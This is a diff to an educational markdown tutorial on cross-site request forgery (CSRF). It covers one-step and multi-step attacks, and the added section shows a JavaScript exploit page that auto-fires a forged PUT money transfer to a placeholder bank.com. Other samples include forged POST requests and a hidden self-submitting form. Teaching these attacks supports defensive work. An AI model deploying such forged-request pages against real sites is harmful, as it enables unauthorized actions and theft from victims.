@@ -52,7 +52,7 @@ In our example, the **Website visitor** is the **client** and the **website** is
 **One step CSRF** is when the action trigered by the hacker link doesn't need more action to be performed. So in this kind of CSRF the hacker just need to forged a link and send it to the the victim. 
 
 ### Multi staged CSRF 
-In **multi-step csrf** the action trigered by the hacker link needs more actions from the victim to be completed.So here, the hacker will forged multi links trigered by time or by others events in order for the CSRF to be completely done.
+In **multi-step CSRF** the action trigered by the hacker link needs more actions from the victim to be completed.So here, the hacker will forged multi links trigered by time or by others events in order for the CSRF to be completely done.
 ![CSRF multi-steps](items/image.png)
 
 # Exploitation samples
@@ -78,6 +78,7 @@ The only difference between **GET** and **POST** attacks is how the attack is be
 
 ```http
 POST http://bank.com/transfer.do HTTP/1.1
+
 acct=PERPRETOR&amount=100
 ```
 Such a request cannot be delivered using standard **A** or **IMG** tags, but can be delivered using a **FORM** tag: 
@@ -97,6 +98,26 @@ This form will require the user to click on the submit button, but this can be a
   <input type="hidden" name="amount" value="100000"/>
   <input type="submit" value="View my pictures"/>
 </form>
+```
+
+## Other HTTP methods
+Modern web application APIs frequently use other HTTP methods, such as **PUT** or **DELETE**. Let's assume the vulnerable bank uses **PUT** that takes a **JSON** block as an argument: 
+```http
+PUT http://bank.com/transfer.do HTTP/1.1
+
+{ "acct":"BOB", "amount":100 }
+```
+Such requests can be executed with JavaScript embedded into an exploit page: 
+```javascript
+<script>
+  function put() {
+    var x = new XMLHttpRequest();
+    x.open("PUT","http://bank.com/transfer.do",true);
+    x.setRequestHeader("Content-Type", "application/json"); 
+    x.send(JSON.stringify({"acct":"BOB", "amount":100})); 
+  }
+</script>
+<body onload="put()">
 ```
 ## Presence detection
 Detection of CSRF flaws is made via **penetration testing** or **code analysis**. 
